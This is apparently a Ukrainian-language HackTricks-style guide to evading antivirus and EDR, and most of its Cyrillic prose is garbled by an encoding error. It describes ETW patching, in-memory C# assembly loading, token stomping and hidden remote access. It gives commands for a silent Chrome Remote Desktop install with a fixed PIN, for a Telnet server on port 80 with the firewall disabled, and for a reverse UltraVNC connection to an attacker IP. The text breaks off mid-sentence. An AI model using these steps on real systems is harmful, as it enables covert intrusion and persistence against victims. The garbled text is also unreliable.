Event Tracing for Windows (ETW) ‚Äî —Ü–µ –ø–æ—Ç—É–∂–Ω–∏–π –º–µ—Ö–∞–Ω—ñ–∑–º –≤–µ–¥–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ —É Windows, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –¥–æ–¥–∞—Ç–∫–∞–º —ñ —Å–∏—Å—Ç–µ–º–Ω–∏–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º **—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏ –ø–æ–¥—ñ—ó**. –û–¥–Ω–∞–∫ –π–æ–≥–æ —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑–∞—Å–æ–±–∏ –±–µ–∑–ø–µ–∫–∏ –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É —Ç–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ—ó –¥—ñ—è–ª—å–Ω–æ—Å—Ç—ñ.

–ü–æ–¥—ñ–±–Ω–æ –¥–æ —Ç–æ–≥–æ, —è–∫ AMSI –≤–∏–º–∫–Ω–µ–Ω–æ (–æ–±—ñ–π–¥–µ–Ω–æ), —Ç–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –∑–º—É—Å–∏—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é **`EtwEventWrite`** –ø—Ä–æ—Ü–µ—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–æ–≥–æ –ø—Ä–æ—Å—Ç–æ—Ä—É –ø–æ–≤–µ—Ä—Ç–∞—Ç–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –Ω–µ–≥–∞–π–Ω–æ, –Ω–µ —Ä–µ—î—Å—Ç—Ä—É—é—á–∏ –∂–æ–¥–Ω–∏—Ö –ø–æ–¥—ñ–π. –¶–µ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –ø–∞—Ç—á—É–≤–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó –≤ –ø–∞–º'—è—Ç—ñ, —â–æ–± –≤–æ–Ω–∞ –ø–æ–≤–µ—Ä—Ç–∞–ª–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –Ω–µ–≥–∞–π–Ω–æ, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –≤–∏–º–∏–∫–∞—é—á–∏ –≤–µ–¥–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ ETW –¥–ª—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É.

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) —Ç–∞ [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.

## C# Assembly Reflection

–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è C# –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ —É –ø–∞–º'—è—Ç—å –≤—ñ–¥–æ–º–æ –≤–∂–µ –¥–æ—Å–∏—Ç—å –¥–∞–≤–Ω–æ, —ñ —Ü–µ –≤—Å–µ —â–µ –¥—É–∂–µ —Ö–æ—Ä–æ—à–∏–π —Å–ø–æ—Å—ñ–± –∑–∞–ø—É—Å–∫—É –≤–∞—à–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –ø—ñ—Å–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –±–µ–∑ —Ä–∏–∑–∏–∫—É –±—É—Ç–∏ —Å–ø—ñ–π–º–∞–Ω–∏–º AV.

–û—Å–∫—ñ–ª—å–∫–∏ payload –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ –ø–∞–º'—è—Ç—å –±–µ–∑ –¥–æ—Å—Ç—É–ø—É –¥–æ –¥–∏—Å–∫–∞, –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ –ª–∏—à–µ –ø–æ–¥–±–∞—Ç–∏ –ø—Ä–æ –ø–∞—Ç—á—É–≤–∞–Ω–Ω—è AMSI –¥–ª—è –≤—Å—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É.

–ë—ñ–ª—å—à—ñ—Å—Ç—å C2 —Ñ—Ä–µ–π–º–≤–æ—Ä–∫—ñ–≤ (sliver, Covenant, metasploit, CobaltStrike, Havoc —Ç–æ—â–æ) –≤–∂–µ –Ω–∞–¥–∞—é—Ç—å –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ C# –∑–±—ñ—Ä–∫–∏ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ –ø–∞–º'—è—Ç—ñ, –∞–ª–µ —ñ—Å–Ω—É—é—Ç—å —Ä—ñ–∑–Ω—ñ —Å–ø–æ—Å–æ–±–∏ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ:

- **Fork\&Run**

–¶–µ –ø–µ—Ä–µ–¥–±–∞—á–∞—î **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∂–µ—Ä—Ç–≤–µ–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É**, —ñ–Ω'—î–∫—Ü—ñ—é –≤–∞—à–æ–≥–æ —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –∫–æ–¥—É –ø—ñ—Å–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤ —Ü–µ–π –Ω–æ–≤–∏–π –ø—Ä–æ—Ü–µ—Å, –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∞—à–æ–≥–æ —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –∫–æ–¥—É, –∞ –ø–æ—Ç—ñ–º –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É. –¶–µ –º–∞—î —Å–≤–æ—ó –ø–µ—Ä–µ–≤–∞–≥–∏ —Ç–∞ –Ω–µ–¥–æ–ª—ñ–∫–∏. –ü–µ—Ä–µ–≤–∞–≥–∞ –º–µ—Ç–æ–¥—É fork and run –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è **–∑–∑–æ–≤–Ω—ñ** –Ω–∞—à–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É Beacon implant. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —è–∫—â–æ —â–æ—Å—å —É –Ω–∞—à—ñ–π –¥—ñ—ó –ø—ñ—Å–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –ø—ñ–¥–µ –Ω–µ —Ç–∞–∫ –∞–±–æ –±—É–¥–µ —Å–ø—ñ–π–º–∞–Ω–æ, —î **–Ω–∞–±–∞–≥–∞—Ç–æ –±—ñ–ª—å—à–∞ –π–º–æ–≤—ñ—Ä–Ω—ñ—Å—Ç—å**, —â–æ –Ω–∞—à **—ñ–º–ø–ª–∞–Ω—Ç –≤–∏–∂–∏–≤–µ.** –ù–µ–¥–æ–ª—ñ–∫ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ —É –≤–∞—Å —î **–±—ñ–ª—å—à–∞ –π–º–æ–≤—ñ—Ä–Ω—ñ—Å—Ç—å** –±—É—Ç–∏ —Å–ø—ñ–π–º–∞–Ω–∏–º –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–ø–æ–≤–µ–¥—ñ–Ω–∫–æ–≤–∏—Ö –≤–∏—è–≤–ª–µ–Ω—å**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

–¶–µ –ø—Ä–æ —ñ–Ω'—î–∫—Ü—ñ—é —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –∫–æ–¥—É –ø—ñ—Å–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó **–≤ –π–æ–≥–æ –≤–ª–∞—Å–Ω–∏–π –ø—Ä–æ—Ü–µ—Å**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤–∏ –º–æ–∂–µ—Ç–µ —É–Ω–∏–∫–Ω—É—Ç–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É —Ç–∞ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –π–æ–≥–æ AV, –∞–ª–µ –Ω–µ–¥–æ–ª—ñ–∫ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ —è–∫—â–æ —â–æ—Å—å –ø—ñ–¥–µ –Ω–µ —Ç–∞–∫ –∑ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è–º –≤–∞—à–æ–≥–æ payload, —î **–Ω–∞–±–∞–≥–∞—Ç–æ –±—ñ–ª—å—à–∞ –π–º–æ–≤—ñ—Ä–Ω—ñ—Å—Ç—å** **–≤—Ç—Ä–∞—Ç–∏—Ç–∏ –≤–∞—à beacon**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –º–æ–∂–µ –∑–ª–∞–º–∞—Ç–∏—Å—è.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è C# Assembly, –±—É–¥—å –ª–∞—Å–∫–∞, –æ–∑–Ω–∞–π–æ–º—Ç–µ—Å—è –∑ —Ü—ñ—î—é —Å—Ç–∞—Ç—Ç–µ—é [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) —Ç–∞ —ó—Ö InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ C# –∑–±—ñ—Ä–∫–∏ **–∑ PowerShell**, –æ–∑–Ω–∞–π–æ–º—Ç–µ—Å—è –∑ [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) —Ç–∞ [–≤—ñ–¥–µ–æ S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —ñ–Ω—à–∏—Ö –º–æ–≤ –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è

–Ø–∫ –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–æ –≤ [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π –∫–æ–¥, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–Ω—à—ñ –º–æ–≤–∏, –Ω–∞–¥–∞—é—á–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω—ñ–π –º–∞—à–∏–Ω—ñ –¥–æ—Å—Ç—É–ø **–¥–æ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ–≥–æ –Ω–∞ SMB-—Ä–µ—Å—É—Ä—Å—ñ, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–º—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º**.

–î–æ–∑–≤–æ–ª—è—é—á–∏ –¥–æ—Å—Ç—É–ø –¥–æ –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞ —Ç–∞ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –Ω–∞ SMB-—Ä–µ—Å—É—Ä—Å—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥ –Ω–∞ —Ü–∏—Ö –º–æ–≤–∞—Ö —É –ø–∞–º'—è—Ç—ñ** —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ—ó –º–∞—à–∏–Ω–∏.

–†–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ–π –≤–∫–∞–∑—É—î: Defender –≤—Å–µ —â–µ —Å–∫–∞–Ω—É—î —Å–∫—Ä–∏–ø—Ç–∏, –∞–ª–µ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Go, Java, PHP —Ç–æ—â–æ, –º–∏ –º–∞—î–º–æ **–±—ñ–ª—å—à—É –≥–Ω—É—á–∫—ñ—Å—Ç—å –¥–ª—è –æ–±—Ö–æ–¥—É —Å—Ç–∞—Ç–∏—á–Ω–∏—Ö –ø—ñ–¥–ø–∏—Å—ñ–≤**. –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è –≤–∏–ø–∞–¥–∫–æ–≤–∏—Ö –Ω–µ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–∏—Ö —Ä–µ–≤–µ—Ä—Å-shell —Å–∫—Ä–∏–ø—Ç—ñ–≤ –Ω–∞ —Ü–∏—Ö –º–æ–≤–∞—Ö –≤–∏—è–≤–∏–ª–æ—Å—è —É—Å–ø—ñ—à–Ω–∏–º.

## TokenStomping

Token stomping ‚Äî —Ü–µ —Ç–µ—Ö–Ω—ñ–∫–∞, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É **–º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω–æ–º –¥–æ—Å—Ç—É–ø—É –∞–±–æ –∑–∞—Å–æ–±–æ–º –±–µ–∑–ø–µ–∫–∏, —Ç–∞–∫–∏–º —è–∫ EDR –∞–±–æ AV**, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –∑–º–µ–Ω—à–∏—Ç–∏ –π–æ–≥–æ –ø—Ä–∏–≤—ñ–ª–µ—ó, —â–æ–± –ø—Ä–æ—Ü–µ—Å –Ω–µ –∑—É–ø–∏–Ω–∏–≤—Å—è, –∞–ª–µ –Ω–µ –º–∞–≤ –±–∏ –¥–æ–∑–≤–æ–ª—ñ–≤ –Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É —à–∫—ñ–¥–ª–∏–≤–æ—ó –¥—ñ—è–ª—å–Ω–æ—Å—Ç—ñ.

–©–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ —Ü—å–æ–º—É, Windows –º–æ–∂–µ **–∑–∞–±–æ—Ä–æ–Ω–∏—Ç–∏ –∑–æ–≤–Ω—ñ—à–Ω—ñ–º –ø—Ä–æ—Ü–µ—Å–∞–º** –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ —Ç–æ–∫–µ–Ω—ñ–≤ –±–µ–∑–ø–µ–∫–∏.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –Ω–∞–¥—ñ–π–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è

### Chrome Remote Desktop

–Ø–∫ –æ–ø–∏—Å–∞–Ω–æ –≤ [**—Ü—å–æ–º—É –±–ª–æ–∑—ñ**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), –ª–µ–≥–∫–æ –ø—Ä–æ—Å—Ç–æ —Ä–æ–∑–≥–æ—Ä–Ω—É—Ç–∏ Chrome Remote Desktop –Ω–∞ –∫–æ–º–ø'—é—Ç–µ—Ä—ñ –∂–µ—Ä—Ç–≤–∏, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –ø–æ—Å—Ç—ñ–π–Ω–æ—Å—Ç—ñ:
1. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –∑ https://remotedesktop.google.com/, –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å "–ù–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —á–µ—Ä–µ–∑ SSH", –∞ –ø–æ—Ç—ñ–º –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ MSI —Ñ–∞–π–ª –¥–ª—è Windows, —â–æ–± –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ MSI —Ñ–∞–π–ª.
2. –ó–∞–ø—É—Å—Ç—ñ—Ç—å —É—Å—Ç–∞–Ω–æ–≤–Ω–∏–∫ –±–µ–∑ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –≤ –∂–µ—Ä—Ç–≤—ñ (–ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø—Ä–∞–≤–∞ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞): `msiexec /i chromeremotedesktophost.msi /qn`
3. –ü–æ–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É Chrome Remote Desktop —ñ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –¥–∞–ª—ñ. –ú–∞–π—Å—Ç–µ—Ä –∑–∞–ø–∏—Ç–∞—î –≤–∞—Å –ø—Ä–æ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é; –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –ê–≤—Ç–æ—Ä–∏–∑—É–≤–∞—Ç–∏, —â–æ–± –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏.
4. –í–∏–∫–æ–Ω–∞–π—Ç–µ –≤–∫–∞–∑–∞–Ω–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä –∑ –¥–µ—è–∫–∏–º–∏ –∫–æ—Ä–∏–≥—É–≤–∞–Ω–Ω—è–º–∏: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä pin, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ pin –±–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è GUI).

## –†–æ–∑—à–∏—Ä–µ–Ω–µ —É—Ö–∏–ª–µ–Ω–Ω—è

–£—Ö–∏–ª–µ–Ω–Ω—è ‚Äî —Ü–µ –¥—É–∂–µ —Å–∫–ª–∞–¥–Ω–∞ —Ç–µ–º–∞, —ñ–Ω–æ–¥—ñ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Ä–∞—Ö–æ–≤—É–≤–∞—Ç–∏ –±–∞–≥–∞—Ç–æ —Ä—ñ–∑–Ω–∏—Ö –¥–∂–µ—Ä–µ–ª —Ç–µ–ª–µ–º–µ—Ç—Ä—ñ—ó –≤ –æ–¥–Ω—ñ–π —Å–∏—Å—Ç–µ–º—ñ, —Ç–æ–º—É –ø—Ä–∞–∫—Ç–∏—á–Ω–æ –Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–∞–ª–∏—à–∞—Ç–∏—Å—è –ø–æ–≤–Ω—ñ—Å—Ç—é –Ω–µ–ø–æ–º—ñ—á–µ–Ω–∏–º —É –∑—Ä—ñ–ª–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö.

–ö–æ–∂–Ω–µ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ, –∑ —è–∫–∏–º –≤–∏ —Å—Ç–∏–∫–∞—î—Ç–µ—Å—è, –º–∞—Ç–∏–º–µ —Å–≤–æ—ó –≤–ª–∞—Å–Ω—ñ —Å–∏–ª—å–Ω—ñ —Ç–∞ —Å–ª–∞–±–∫—ñ —Å—Ç–æ—Ä–æ–Ω–∏.

–Ø –Ω–∞—Å—Ç—ñ–π–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é –≤–∞–º –ø–æ–¥–∏–≤–∏—Ç–∏—Å—è —Ü—é –¥–æ–ø–æ–≤—ñ–¥—å –≤—ñ–¥ [@ATTL4S](https://twitter.com/DaniLJ94), —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —É—è–≤–ª–µ–Ω–Ω—è –ø—Ä–æ –±—ñ–ª—å—à —Ä–æ–∑—à–∏—Ä–µ–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ —É—Ö–∏–ª–µ–Ω–Ω—è.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

–¶–µ —Ç–∞–∫–æ–∂ —â–µ –æ–¥–Ω–∞ —á—É–¥–æ–≤–∞ –¥–æ–ø–æ–≤—ñ–¥—å –≤—ñ–¥ [@mariuszbit](https://twitter.com/mariuszbit) –ø—Ä–æ —É—Ö–∏–ª–µ–Ω–Ω—è –≤ –≥–ª–∏–±–∏–Ω—ñ.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **–°—Ç–∞—Ä—ñ —Ç–µ—Ö–Ω—ñ–∫–∏**

### **–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫—ñ —á–∞—Å—Ç–∏–Ω–∏ Defender –≤–≤–∞–∂–∞—î —à–∫—ñ–¥–ª–∏–≤–∏–º–∏**

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), —è–∫–∏–π **–≤–∏–¥–∞–ª–∏—Ç—å —á–∞—Å—Ç–∏–Ω–∏ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É**, –ø–æ–∫–∏ –Ω–µ **–≤–∏—è–≤–∏—Ç—å, —è–∫–∞ —á–∞—Å—Ç–∏–Ω–∞ Defender** –≤–≤–∞–∂–∞—î —à–∫—ñ–¥–ª–∏–≤–æ—é, —ñ —Ä–æ–∑–¥—ñ–ª–∏—Ç—å —ó—ó –¥–ª—è –≤–∞—Å.\
–Ü–Ω—à–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π —Ä–æ–±–∏—Ç—å **—Ç–µ —Å–∞–º–µ** ‚Äî —Ü–µ [**avred**](https://github.com/dobin/avred) –∑ –≤—ñ–¥–∫—Ä–∏—Ç–∏–º –≤–µ–±-—Å–∞–π—Ç–æ–º, —â–æ –ø—Ä–æ–ø–æ–Ω—É—î –ø–æ—Å–ª—É–≥—É –≤ [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

–î–æ Windows 10 –≤—Å—ñ Windows –ø–æ—Å—Ç–∞—á–∞–ª–∏—Å—è –∑ **Telnet —Å–µ—Ä–≤–µ—Ä–æ–º**, —è–∫–∏–π –≤–∏ –º–æ–≥–ª–∏ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ (—è–∫ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä), –≤–∏–∫–æ–Ω–∞–≤—à–∏:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
–ó—Ä–æ–±—ñ—Ç—å —Ç–∞–∫, —â–æ–± –≤—ñ–Ω **–∑–∞–ø—É—Å–∫–∞–≤—Å—è** –ø—ñ–¥ —á–∞—Å —Å—Ç–∞—Ä—Ç—É —Å–∏—Å—Ç–µ–º–∏, —ñ **–≤–∏–∫–æ–Ω–∞–π—Ç–µ** –π–æ–≥–æ –∑–∞—Ä–∞–∑:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**–ó–º—ñ–Ω–∏—Ç–∏ –ø–æ—Ä—Ç telnet** (–ø—Ä–∏—Ö–æ–≤–∞–Ω–æ) —Ç–∞ –≤–∏–º–∫–Ω—É—Ç–∏ –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –π–æ–≥–æ –∑: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω—ñ –±—ñ–Ω–∞—Ä–Ω—ñ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, –∞ –Ω–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è)

**–ù–ê –•–û–°–¢–Ü**: –í–∏–∫–æ–Ω–∞–π—Ç–µ _**winvnc.exe**_ —ñ –Ω–∞–ª–∞—à—Ç—É–π—Ç–µ —Å–µ—Ä–≤–µ—Ä:

- –£–≤—ñ–º–∫–Ω—ñ—Ç—å –æ–ø—Ü—ñ—é _Disable TrayIcon_
- –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –ø–∞—Ä–æ–ª—å —É _VNC Password_
- –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –ø–∞—Ä–æ–ª—å —É _View-Only Password_

–ü–æ—Ç—ñ–º –ø–µ—Ä–µ–º—ñ—Å—Ç—ñ—Ç—å –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª _**winvnc.exe**_ —ñ **–Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–∏–π** —Ñ–∞–π–ª _**UltraVNC.ini**_ –≤—Å–µ—Ä–µ–¥–∏–Ω—É **–∂–µ—Ä—Ç–≤–∏**

#### **–ó–≤–æ—Ä–æ—Ç–Ω–µ –∑'—î–¥–Ω–∞–Ω–Ω—è**

**–ê—Ç–∞–∫—É—é—á–∏–π** –ø–æ–≤–∏–Ω–µ–Ω **–≤–∏–∫–æ–Ω–∞—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ** —Å–≤–æ–≥–æ **—Ö–æ—Å—Ç–∞** –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `vncviewer.exe -listen 5900`, —â–æ–± –≤—ñ–Ω –±—É–≤ **–≥–æ—Ç–æ–≤–∏–π** –ø—Ä–∏–π–Ω—è—Ç–∏ –∑–≤–æ—Ä–æ—Ç–Ω–µ **VNC –∑'—î–¥–Ω–∞–Ω–Ω—è**. –ü–æ—Ç—ñ–º, –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–∂–µ—Ä—Ç–≤–∏**: –ó–∞–ø—É—Å—Ç—ñ—Ç—å –¥–µ–º–æ–Ω winvnc `winvnc.exe -run` —ñ –≤–∏–∫–æ–Ω–∞–π—Ç–µ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**–ü–û–ü–ï–†–ï–î–ñ–ï–ù–ù–Ø:** –©–æ–± –∑–±–µ—Ä–µ–≥—Ç–∏ –Ω–µ–ø–æ–º—ñ—Ç–Ω—ñ—Å—Ç—å, –≤–∏ –Ω–µ –ø–æ–≤–∏–Ω–Ω—ñ —Ä–æ–±–∏—Ç–∏ –∫—ñ–ª—å–∫–∞ —Ä–µ—á–µ–π

